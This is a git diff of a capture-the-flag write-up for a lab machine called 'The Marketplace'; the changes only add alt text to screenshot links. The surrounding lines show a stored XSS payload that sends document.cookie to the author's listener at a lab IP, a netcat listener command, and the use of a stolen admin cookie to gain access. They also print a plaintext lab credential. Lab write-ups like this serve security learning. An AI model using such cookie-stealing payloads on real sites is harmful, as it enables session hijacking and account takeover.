@@ -54,7 +54,7 @@ Visiting the website we have a MARKETPLACE wow.
 
 Initially I though I could get XSS sending `<SCRIPT>alert("XSS");//\<</SCRIPT>` through the messages to myselfs created account, but the messages seemed to be parsed and turned to URL safe text. Did however get XSS "adding a new listing" with `<SCRIPT>alert("XSS");//\<</SCRIPT>` then visiting the item `http://10.10.144.85/item/4` 
 
-![](/assets/the-marketplace01.png)
+![0xskar](/assets/the-marketplace01.png)
 
 Also, visiting the pages through burpsuite we can see this is giving us a cookie. Visiting /admin it tells us that we are not authorized to view it. On the listing page there is a Report listing to admins.
 
@@ -62,13 +62,13 @@ Setup listening port on kali linux `nc -nvlkp 6969`
 
 Add a new listing with this xss `<script>document.location='http://10.2.127.225:6969/XSS/grabber.php?c='+document.cookie</script>`
 
-![](/assets/the-marketplace02.png)
+![0xskar](/assets/the-marketplace02.png)
 
 We get our cookie sent through the netcat listner. 
 
 We can then goto `http://10.10.144.5/report/3` to report the listing to the admin.
 
-![](/assets/the-marketplace03.png)
+![0xskar](/assets/the-marketplace03.png)
 
 Boom, we receive the admin cookie!
 
@@ -82,7 +82,7 @@ Putting this into the firefox inspector lets us access the admin page.
 
 ## Flag 1
 
-![](/assets/the-marketplace04.png)
+![0xskar](/assets/the-marketplace04.png)
 
 * * * 
 
@@ -92,7 +92,7 @@ Putting this into the firefox inspector lets us access the admin page.
 
 my sqlmap isnt working qq i only get 403 responses...
 
-![](/assets/the-marketplace05.png)
+![0xskar](/assets/the-marketplace05.png)
 
 - `jake:@b_ENXkGYUCAv3zJ`
 
